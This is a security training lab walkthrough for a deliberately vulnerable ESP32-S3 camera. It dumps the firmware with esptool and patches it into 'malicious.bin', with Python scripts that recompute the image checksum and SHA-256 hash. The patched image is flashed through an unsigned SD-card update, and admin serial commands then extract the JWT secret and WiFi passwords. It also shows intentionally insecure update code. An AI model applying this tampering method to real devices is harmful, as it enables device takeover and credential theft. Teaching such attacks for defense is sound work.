# L05: SD Card Bootloader Bypass

## Goal
Flash unsigned firmware via SD card without authentication or signature verification, then dump firmware to extract embedded secrets.

## Background

**Why this matters**: Many IoT devices support offline firmware updates via SD card or USB for field deployment. Without signature verification, anyone with brief physical access can install malicious firmware.

**What you're looking for in IoT devices:**
- SD card or USB firmware update feature
- Lack of signature verification on update files
- Automatic update execution at boot
- No authentication or version checks
- Serial commands that dump firmware contents

**Why this happens:**
- Offline updates needed for field deployment without network access
- Signature verification adds complexity and key management overhead
- Developers assume physical access means the device is already compromised
- Debug commands (`flashdump`, `partdump`, `nvs-dump`) left enabled in production builds

**On CoreS3**: The firmware calls `checkSDCardUpdate()` at boot, looks for `/firmware.bin` on the SD card, and flashes it using the ESP32 Update library without any signature or version checks. Serial shell commands (`flashdump`, `partdump`, `nvs-dump`) allow dumping firmware contents, exposing embedded secrets like the JWT secret .

```cpp
// From CameraDevice.cpp - checkSDCardUpdate()
File image = SD.open("/firmware.bin", FILE_READ);
size_t size = image.size();
// TODO: add signature/integrity/rollback checks before flashing
if (!Update.begin(size)) { return; }       // No signature verification
Update.writeStream(image);                  // Flashes any valid ESP32 binary
Update.end();                               // No version check, no user confirmation
SD.rename("/firmware.bin", "/firmware.bin.applied");
ESP.restart();
```

## Lab Walkthrough

### Step 1: Check Current Firmware Version

Connect to the device over USB serial and check the current firmware version. You will use this to confirm the attack worked after flashing the patched firmware.

```bash
pio device monitor -b 115200

cores3-cam> status

# Expected output includes:
# Firmware: 1.0.0
```

Close the serial monitor before proceeding (Ctrl+C) - the serial port must be free for `esptool` to connect.

### Step 2: Extract Firmware from Device

Use `esptool` to dump the application partition from the device's flash memory. The partition table defines the application at offset `0x10000` with a size of `0x300000` (3MB). This reads the entire partition contents over USB serial and saves it to a local file.

This step takes several minutes - `esptool` reads flash at ~90 kbit/s over the USB serial connection.

```bash
esptool --chip esp32s3 --port /dev/ttyACM0 read_flash 0x10000 0x300000 extracted.bin

ls -lh extracted.bin
# Expected: 3.0M
```

The resulting file contains the full firmware image at the start, followed by 0xFF padding bytes (erased flash). The actual application code is roughly the first ~2MB; the rest is empty space within the 3MB partition.

### Step 3: Understand the ESP32 Image Format

Before patching, you need to understand how ESP32 app images are structured. The bootloader validates the image on every boot using two integrity checks. If either fails, the image is rejected and the device will not run it. Any byte you modify in the firmware will break these checks, so you must fix them after patching.

**ESP32-S3 app image layout:**

```
Offset 0x00: Image Header (24 bytes)
  Byte 0:    Magic byte (0xE9) - identifies this as an ESP32 app image
  Byte 1:    Number of segments - how many code/data segments follow
  Bytes 2-3: SPI flash mode and speed settings
  Bytes 4-7: Entry point address - where the CPU starts executing
  ...
  Byte 23:   Hash appended flag (0x01 = SHA256 hash is present at the end)

Offset 0x18: Segment headers and data (variable length, repeated for each segment)
  Each segment has:
    8-byte header: 4-byte load address + 4-byte size
    Followed by <size> bytes of segment data (code or initialized data)

After last segment:
  Zero-padding to align to a 16-byte boundary
  1-byte XOR checksum (occupies the last byte of the padded block)
  32-byte SHA256 hash (if byte 23 flag is 0x01)

Remaining bytes to end of partition: 0xFF padding (erased flash, not part of the image)
```

**The two integrity checks you must fix after patching:**

1. **XOR checksum**: A single byte computed by XORing all segment data bytes together, starting with the seed value `0xEF`. Only segment data is included - segment headers and the image header are NOT part of the checksum. The checksum byte sits at the last byte before the next 16-byte-aligned boundary after all segments end. If this byte does not match the computed XOR, the bootloader rejects the image with "Checksum failed."

2. **SHA256 hash**: A 32-byte SHA-256 digest covering everything from byte 0 of the image through the checksum byte (inclusive). It is stored in the 32 bytes immediately following the checksum. If this hash does not match, the bootloader rejects the image with "Could Not Activate The Firmware."

### Step 4: Locate and Patch the Version String

Use `strings` to find all occurrences of the version string in the extracted firmware. The `-t x` flag prints the hex offset of each match, which helps you locate them in the hex editor.

```bash
strings -t x extracted.bin | grep "1\.0\.0"
# Example output:
#   6c5 Firmware: 1.0.0
#   335c 1.0.0
#   5774 EXIF_SOFTWARE: ESP32-S3 Camera v1.0.0-debug
#   7b98 1.0.0-debug
#   ae64 v1.0.0
```

Make a copy of the extracted firmware (never modify the original - you may need it for comparison or to start over) and open the copy in a hex editor:

```bash
cp extracted.bin malicious.bin
hexeditor malicious.bin

#or use this python

python3 -c "from pathlib import Path; p=Path('malicious.bin'); b=p.read_bytes(); p.write_bytes(b.replace(bytes.fromhex('31 2E 30 2E 30'), bytes.fromhex('39 2E 39 2E 39')))"
```

Search for the hex bytes `31 2E 30 2E 30` (the ASCII encoding of "1.0.0") and replace each occurrence with `39 2E 39 2E 39` (ASCII "9.9.9"). The replacement is the same byte length (5 bytes), so the binary layout is not disturbed - only the content of those bytes changes.

```
Before: 31 2E 30 2E 30  ("1.0.0")
After:  39 2E 39 2E 39  ("9.9.9")
```

Repeat for every occurrence in the file. Save and exit the hex editor.

**Verify the patch worked:**

```bash
# Confirm the version string changed
strings malicious.bin | grep "Firmware:" | head -3
# Expected: "Firmware: 9.9.9" (NOT "Firmware: 1.0.0")

# Confirm all occurrences were patched
strings malicious.bin | grep "9\.9\.9"
# Expected output (multiple occurrences):
#   Firmware: 9.9.9
#   9.9.9
#   EXIF_SOFTWARE: ESP32-S3 Camera v9.9.9-debug
#   9.9.9-debug
#   v9.9.9

# Confirm the original version string is completely gone
strings malicious.bin | grep "1\.0\.0"
# Expected: NO output (if any lines appear, you missed an occurrence)

# Confirm file size is unchanged (patching must not add or remove bytes)
ls -l extracted.bin malicious.bin
# Both must be the same size
```

**STOP** - if `Firmware: 1.0.0` still appears, the hex edit did not save correctly. Re-open the file in hexeditor and verify your changes were written. In `hexeditor`, use Ctrl+X to save. In `hexedit`, use Ctrl+W.

### Step 5: Fix the XOR Checksum

Patching the version string changed bytes inside a segment's data region, which invalidates the XOR checksum. The bootloader computes the checksum at boot and compares it to the stored value - if they differ, it rejects the image with "Checksum failed."

You need to find where the checksum byte is stored, then recalculate it based on the modified data.

**Locate the checksum byte:**

The checksum position depends on the total size of all segments. You must walk through the image header to find the end of the last segment, then calculate the aligned position. This Python one-liner parses the segment table and prints the checksum location:

```bash
python3 -c "
import struct
data = open('malicious.bin','rb').read()
print(f'Segments: {data[1]}')
print(f'Hash appended: {\"yes\" if data[23] else \"no\"}')
off = 24
for i in range(data[1]):
    sz = struct.unpack_from('<I', data, off+4)[0]
    print(f'  Seg {i}: data at 0x{off+8:X}, size {sz} bytes (0x{sz:X})')
    off += 8 + sz
ckpos = ((off + 16) & ~15) - 1
print(f'Checksum byte at offset: 0x{ckpos:X}')
print(f'Current value: 0x{data[ckpos]:02X}')
"
```

**Recalculate and write the new checksum:**

The checksum algorithm: start with the seed value `0xEF`, then XOR every byte of segment data (skipping the 8-byte segment headers). The result is a single byte that replaces the old checksum. This script reads the patched binary, computes the correct checksum, writes it to the correct offset, and saves the file:

```bash
python3 -c "
import struct
data = bytearray(open('malicious.bin','rb').read())
chk = 0xEF
off = 24
for i in range(data[1]):
    sz = struct.unpack_from('<I', data, off+4)[0]
    for j in range(off+8, off+8+sz):
        chk ^= data[j]
    off += 8 + sz
ckpos = ((off + 16) & ~15) - 1
print(f'Old checksum: 0x{data[ckpos]:02X}')
data[ckpos] = chk
print(f'New checksum: 0x{chk:02X}')
open('malicious.bin','wb').write(data)
print('Checksum fixed')
"
```

### Step 6: Fix the SHA256 Hash

The ESP32 bootloader also verifies a SHA-256 hash that covers the entire image from byte 0 through the checksum byte (inclusive). Since you changed both the version string bytes and the checksum byte, this hash is now invalid. The bootloader will reject the image with "Could Not Activate The Firmware" if the hash does not match.

The hash is stored in the 32 bytes immediately after the checksum byte. This script recomputes the SHA-256 digest over everything before the hash and writes the new hash in place:

```bash
python3 -c "
import struct, hashlib
data = bytearray(open('malicious.bin','rb').read())
off = 24
for i in range(data[1]):
    sz = struct.unpack_from('<I', data, off+4)[0]
    off += 8 + sz
ckpos = ((off + 16) & ~15) - 1
hash_start = ckpos + 1
new_hash = hashlib.sha256(data[:hash_start]).digest()
data[hash_start:hash_start+32] = new_hash
open('malicious.bin','wb').write(data)
print(f'SHA256 updated at offset 0x{hash_start:X}')
"
```

**Verify the patched image is valid:**

Run all these checks before proceeding. If any fail, go back and redo the failing step.

```bash
# Confirm esptool can parse the image without errors
esptool image_info malicious.bin
# Should show: "Detected image type: ESP32-S3" and segment details
# If you see errors, the checksum or hash is still wrong

# Confirm file size has not changed
ls -l extracted.bin malicious.bin
# Both must be the same size

# Confirm the patched version string survived the checksum/hash fixes
strings malicious.bin | grep "Firmware:"
# Expected: "Firmware: 9.9.9"
# If this shows "1.0.0", something overwrote your patch - start over from Step 4

# Confirm the original version is gone
strings malicious.bin | grep "1\.0\.0"
# Expected: NO output
```

### Step 7: Prepare SD Card

The `checkSDCardUpdate()` function runs at every boot. It initializes the microSD card slot, checks for a file named `/firmware.bin`, and if found, flashes it to the OTA partition without any signature verification, user confirmation, or version checks. After a successful flash, the device renames the file to `firmware.bin.applied` to prevent re-flashing on the next boot.

Format the SD card as FAT32 (the only filesystem the ESP32 SD library supports) and copy the patched firmware onto it:

```bash
# Unmount the SD card if your OS auto-mounted it
sudo umount /dev/sda1

# Format as FAT32
sudo mkfs.vfat -F 32 /dev/sda1

# Mount and copy the patched firmware
sudo mount /dev/sda1 /mnt
sudo cp malicious.bin /mnt/firmware.bin
```

**Verify the file on the SD card before unmounting:**

This is the most important verification step. If the wrong file ends up on the SD card, the attack will either fail silently (flashing the same version) or not work at all.

```bash
# Confirm the file exists and matches the patched binary size
ls -lh /mnt/firmware.bin
# Size must match extracted.bin

# Confirm the patched version string is in the file ON THE SD CARD
strings /mnt/firmware.bin | grep "Firmware:"
# Expected: "Firmware: 9.9.9"
# If this shows "Firmware: 1.0.0", you copied the wrong file

# Verify the file is an exact copy by comparing checksums
md5sum malicious.bin /mnt/firmware.bin
# Both MD5 hashes MUST be identical

sync
sudo umount /mnt
```

**STOP** - if the version shows 1.0.0 or the MD5 hashes differ, do not proceed. You copied the wrong file. Re-copy `malicious.bin` (not `extracted.bin`).

### Step 8: Insert SD Card and Reboot

Remove the SD card from your PC and insert it into the CoreS3's microSD slot (on the side of the device). Power cycle the device by pressing the reset button or unplugging and reconnecting power.

The device checks for `/firmware.bin` during boot, before the PIN lock screen or any user interaction. If the file is found, it is flashed immediately - the entire attack requires only seconds of physical access.

Connect the serial monitor to observe the update:

```bash
pio device monitor -b 115200
```

**Expected serial output:**
```
[SD-UPDATE] Checking SD card for firmware update...
[SD-UPDATE] Found firmware image on SD (XXXXXXX bytes)
[SD-UPDATE] Firmware update from SD card completed. Rebooting...
```

The device will reboot automatically after flashing. On the second boot, it renames `firmware.bin` to `firmware.bin.applied` on the SD card so it does not attempt to re-flash on subsequent boots.

### Step 9: Verify Firmware Version Changed

After the reboot completes, check the firmware version via the serial console. The version string you patched should now be visible in the device status output.

```bash
cores3-cam> status

# Expected output:
=== Device Status ===
Firmware: 9.9.9
...

# This proves:
# - No signature verification: the device accepted a modified binary
# - No version checks: it did not compare against the current version
# - No user confirmation: the update happened automatically at boot
# - Physical access for seconds is enough to fully compromise the device
```

### Step 10: Dump Firmware and Extract Secrets

With the device running your patched firmware, you can use the built-in serial shell commands to extract firmware contents and find hardcoded secrets. The `flashdump`, `partdump`, and `nvs-dump` commands require admin mode - use `login <admin_pin>` first (obtain the admin PIN from L01 UART sniffing, L02 I2C sniffing, L09 path traversal, or L15 unauth config).

```bash
# Without admin mode, sensitive commands are blocked:
cores3-cam> nvs-dump
=== NVS Dump (Key/Value Pairs) ===
ERROR: Admin privileges required.
```

```bash
# Log in as admin, then dump device data:
cores3-cam> login <admin_pin>
Admin mode unlocked.

# List flash partitions to find firmware location and sizes
cores3-cam> part-list

# Dump the factory partition (contains the original firmware)
cores3-cam> partdump factory

# Dump raw flash at offset 0 (bootloader area - contains chip config)
cores3-cam> flashdump 0x0 256

# Dump NVS to see stored secrets (WiFi passwords, PINs, API keys)
cores3-cam> nvs-dump
```

**Save the dump and search for secrets:**
```bash
# Capture serial output to a file using PlatformIO's log2file filter
# (start this BEFORE running the dump commands above)
pio device monitor -b 115200 --filter log2file

# After capturing, search the log file for embedded secrets:
strings firmware_dump.bin | grep -i "secret\|jwt\|password\|key"

# Expected output includes:
# <REDACTED>          <- the jwtSecret (find it via other labs) hardcoded in firmware (enables token forgery, see L10)
# jwtSecret
# wifi_pass
```

### Step 11: Restore Original Firmware

After the SD card update, the device boots from the `ota_0` partition (where the patched firmware was written). The original firmware is still in the `factory` partition, but the bootloader's OTA data tells it to use `ota_0` instead. Simply reflashing the factory partition with `write_flash` will not change which partition the bootloader selects.

To restore, you must erase the entire flash (which clears the OTA boot selection data), then reflash the clean firmware:

```bash
# Close any serial monitors first (the port must be free)

# Full erase wipes all partitions, including the OTA data that tells
# the bootloader to boot from ota_0 instead of factory
esptool --chip esp32s3 --port /dev/ttyACM0 erase_flash

# Reflash the clean firmware to the factory partition
pio run -e M5CoreS3 -t upload

# Verify the device is back to normal
pio device monitor -b 115200
cores3-cam> status
# Should show: Firmware: 1.0.0
```

Clean up the SD card to prevent accidental re-flashing:

```bash
# Insert SD card into PC
sudo mount /dev/sda1 /mnt
sudo rm /mnt/firmware.bin /mnt/firmware.bin.applied 2>/dev/null
sudo umount /mnt
```

## Impact

- **Unsigned firmware accepted**: Any valid ESP32 binary on the SD card is flashed without signature verification
- **No version/rollback checks**: Older or malicious firmware accepted without question
- **Silent boot-time attack**: Firmware is replaced before the PIN lock screen - physical access for seconds is enough
- **Firmware dump exposes secrets**: Serial commands (`flashdump`, `partdump`, `nvs-dump`) allow extracting the full firmware image
- **Hardcoded JWT secret recoverable**: `strings` on a firmware dump reveals the jwtSecret (the `jwtSecret`), enabling token forgery (see L08)
- **Complete device compromise**: Attacker controls all code running on the device

## References

- [ESP32 App Image Format](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/system/app_image_format.html)
- [ESP32 Secure Boot v2](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/secure-boot-v2.html)
- [M5Stack CoreS3 Documentation](https://docs.m5stack.com/en/core/CoreS3)
- [OWASP Firmware Security Testing Methodology](https://owasp.org/www-project-firmware-security-testing-methodology/)
